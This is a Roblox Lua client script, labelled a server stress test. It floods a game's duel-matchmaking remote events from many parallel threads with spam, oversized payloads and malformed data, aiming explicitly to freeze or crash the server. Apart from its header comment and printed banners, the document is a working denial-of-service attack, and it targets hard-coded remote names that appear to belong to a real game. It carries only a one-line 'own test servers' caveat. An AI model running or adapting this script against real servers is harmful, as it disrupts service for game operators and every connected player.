--[[
    ⚠️ AGGRESSIVE STRESS TEST ⚠️
    =============================
    ALL-IN-ONE RAPID FIRE SERVER STRESS TEST
    
    This script runs ALL attack vectors SIMULTANEOUSLY at MAXIMUM speed.
    Designed to find breaking points quickly.
    
    WARNING: This WILL likely crash/freeze the server. That's the point.
    USE ONLY ON YOUR OWN TEST SERVERS.
]]

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

-- CONFIGURATION
local DURATION = 10 -- seconds of chaos
local THREADS = 10  -- parallel attack threads per vector

print("\n")
print("╔═══════════════════════════════════════════════════════════╗")
print("║  ⚠️  AGGRESSIVE STRESS TEST - MAXIMUM INTENSITY  ⚠️       ║")
print("╠═══════════════════════════════════════════════════════════╣")
print("║  Duration: " .. DURATION .. " seconds                                      ║")
print("║  Threads per vector: " .. THREADS .. "                                    ║")
print("║  Attack vectors: ALL SIMULTANEOUS                        ║")
print("╚═══════════════════════════════════════════════════════════╝")
print("\n")

-- Stats tracking
local stats = {
    remoteFlood = 0,
    largePayload = 0,
    acceptSpam = 0,
    stateChange = 0,
    voteSpam = 0,
    selectSpam = 0,
    cancelSpam = 0,
    readySpam = 0,
    errors = 0,
    startTime = os.clock(),
}

-- Get all remotes upfront
local Net = require(ReplicatedStorage.Packages.Net)
local remotes = {}

pcall(function()
    remotes.accept = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Accept")
    remotes.ready = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Ready")
    remotes.cancel = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Cancel")
    remotes.select = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Select")
    remotes.vote = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/Vote")
    remotes.teleportBack = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/TeleportBack")
    remotes.setDevice = Net:RemoteEvent("DuelsMachineMatchService/SelectBrainrot/SetDevice")
    remotes.reconnect = Net:RemoteEvent("DuelsMachineService/Reconnect")
    remotes.reconnectWarn = Net:RemoteEvent("DuelsMachineService/ReconnectWarn")
    remotes.invite = Net:RemoteFunction("DuelsMachineService/Invite")
    remotes.acceptInvite = Net:RemoteFunction("DuelsMachineService/AcceptInvite")
end)

-- Generate garbage data
local function bigTable(size)
    local t = {}
    for i = 1, size do
        t["k" .. i] = string.rep("X", 1000)
    end
    return t
end

local function fakeBrainrot()
    return {
        Index = "Tralalero Tralala",
        UUID = HttpService:GenerateGUID(false),
        Mutation = "Shiny",
        Traits = {"Fast", "Strong", "Speedy"},
    }
end

local function massiveBrainrot()
    return {
        Index = string.rep("A", 50000),
        UUID = HttpService:GenerateGUID(false),
        Mutation = string.rep("B", 50000),
        Traits = bigTable(1000),
    }
end

-- Attack functions (no yielding, maximum speed)
local running = true

local function attackAcceptSpam()
    while running do
        pcall(function() remotes.accept:FireServer() end)
        stats.acceptSpam = stats.acceptSpam + 1
    end
end

local function attackReadySpam()
    while running do
        pcall(function() remotes.ready:FireServer() end)
        stats.readySpam = stats.readySpam + 1
    end
end

local function attackCancelSpam()
    while running do
        pcall(function() remotes.cancel:FireServer() end)
        stats.cancelSpam = stats.cancelSpam + 1
    end
end

local function attackSelectSpam()
    local slot = 1
    while running do
        pcall(function() 
            remotes.select:FireServer(slot, fakeBrainrot()) 
        end)
        stats.selectSpam = stats.selectSpam + 1
        slot = (slot % 10) + 1
    end
end

local function attackVoteSpam()
    local modes = {"Bat Only", "Bat + Medusa", "All Gears"}
    local idx = 1
    while running do
        pcall(function() 
            remotes.vote:FireServer(modes[idx]) 
        end)
        stats.voteSpam = stats.voteSpam + 1
        idx = (idx % 3) + 1
    end
end

local function attackLargePayload()
    while running do
        pcall(function() 
            remotes.select:FireServer(1, massiveBrainrot()) 
        end)
        stats.largePayload = stats.largePayload + 1
    end
end

local function attackStateChange()
    while running do
        pcall(function() remotes.select:FireServer(1, fakeBrainrot()) end)
        pcall(function() remotes.cancel:FireServer() end)
        pcall(function() remotes.ready:FireServer() end)
        pcall(function() remotes.cancel:FireServer() end)
        stats.stateChange = stats.stateChange + 4
    end
end

local function attackRemoteFlood()
    while running do
        -- Hit every remote as fast as possible
        pcall(function() remotes.accept:FireServer() end)
        pcall(function() remotes.ready:FireServer() end)
        pcall(function() remotes.cancel:FireServer() end)
        pcall(function() remotes.vote:FireServer("Bat Only") end)
        pcall(function() remotes.select:FireServer(1, fakeBrainrot()) end)
        pcall(function() remotes.setDevice:FireServer("PC") end)
        pcall(function() remotes.reconnectWarn:FireServer() end)
        stats.remoteFlood = stats.remoteFlood + 7
    end
end

local function attackInvokeFlood()
    while running do
        pcall(function() 
            remotes.invite:InvokeServer(LocalPlayer.UserId) 
        end)
        pcall(function() 
            remotes.acceptInvite:InvokeServer("fake-invite-id") 
        end)
        stats.remoteFlood = stats.remoteFlood + 2
    end
end

local function attackMalformedData()
    local malformed = {
        nil,
        true,
        false,
        0/0, -- NaN
        math.huge,
        -math.huge,
        "",
        string.rep("X", 1000000),
        {},
        {{{{{{{{{{}}}}}}}}}},
        function() end,
        coroutine.create(function() end),
        newproxy(true),
    }
    
    while running do
        for _, data in ipairs(malformed) do
            pcall(function() remotes.select:FireServer(data, data) end)
            pcall(function() remotes.vote:FireServer(data) end)
            stats.remoteFlood = stats.remoteFlood + 2
        end
    end
end

-- Stats display
local function displayStats()
    while running do
        local elapsed = os.clock() - stats.startTime
        local total = stats.acceptSpam + stats.readySpam + stats.cancelSpam + 
                     stats.selectSpam + stats.voteSpam + stats.largePayload + 
                     stats.stateChange + stats.remoteFlood
        
        local rate = total / elapsed
        
        print(string.format(
            "[%.1fs] Total: %d | Rate: %.0f/sec | Accept: %d | Select: %d | Vote: %d | Payload: %d",
            elapsed, total, rate, stats.acceptSpam, stats.selectSpam, stats.voteSpam, stats.largePayload
        ))
        
        task.wait(1)
    end
end

-- LAUNCH ALL ATTACKS
print("🚀 LAUNCHING ALL ATTACK VECTORS...")
print("")

local threads = {}

-- Spawn multiple threads for each attack vector
for i = 1, THREADS do
    table.insert(threads, task.spawn(attackAcceptSpam))
    table.insert(threads, task.spawn(attackReadySpam))
    table.insert(threads, task.spawn(attackCancelSpam))
    table.insert(threads, task.spawn(attackSelectSpam))
    table.insert(threads, task.spawn(attackVoteSpam))
end

-- Additional attack vectors (fewer threads)
for i = 1, math.ceil(THREADS / 2) do
    table.insert(threads, task.spawn(attackLargePayload))
    table.insert(threads, task.spawn(attackStateChange))
    table.insert(threads, task.spawn(attackRemoteFlood))
    table.insert(threads, task.spawn(attackMalformedData))
end

-- RemoteFunction attacks (blocking, so fewer)
for i = 1, 2 do
    table.insert(threads, task.spawn(attackInvokeFlood))
end

-- Stats display thread
task.spawn(displayStats)

print("⚡ " .. #threads .. " attack threads launched!")
print("")

-- Run for duration then stop
task.delay(DURATION, function()
    running = false
    
    task.wait(0.5)
    
    local elapsed = os.clock() - stats.startTime
    local total = stats.acceptSpam + stats.readySpam + stats.cancelSpam + 
                 stats.selectSpam + stats.voteSpam + stats.largePayload + 
                 stats.stateChange + stats.remoteFlood
    
    print("\n")
    print("╔═══════════════════════════════════════════════════════════╗")
    print("║                    TEST COMPLETE                          ║")
    print("╠═══════════════════════════════════════════════════════════╣")
    print(string.format("║  Duration: %.2f seconds                                  ║", elapsed))
    print(string.format("║  Total Requests: %d                               ║", total))
    print(string.format("║  Average Rate: %.0f requests/second                    ║", total / elapsed))
    print("╠═══════════════════════════════════════════════════════════╣")
    print("║  BREAKDOWN:                                               ║")
    print(string.format("║    Accept Spam:    %d                                  ║", stats.acceptSpam))
    print(string.format("║    Ready Spam:     %d                                  ║", stats.readySpam))
    print(string.format("║    Cancel Spam:    %d                                  ║", stats.cancelSpam))
    print(string.format("║    Select Spam:    %d                                  ║", stats.selectSpam))
    print(string.format("║    Vote Spam:      %d                                  ║", stats.voteSpam))
    print(string.format("║    Large Payload:  %d                                  ║", stats.largePayload))
    print(string.format("║    State Changes:  %d                                  ║", stats.stateChange))
    print(string.format("║    Remote Flood:   %d                                  ║", stats.remoteFlood))
    print("╚═══════════════════════════════════════════════════════════╝")
    print("\n")
    
    if total / elapsed > 10000 then
        print("⚠️  HIGH THROUGHPUT ACHIEVED - Server should show stress")
    end
    
    print("Check if server is still responsive...")
    print("If server froze/crashed during test, vulnerability confirmed.")
end)

-- Return stats for programmatic access
return stats
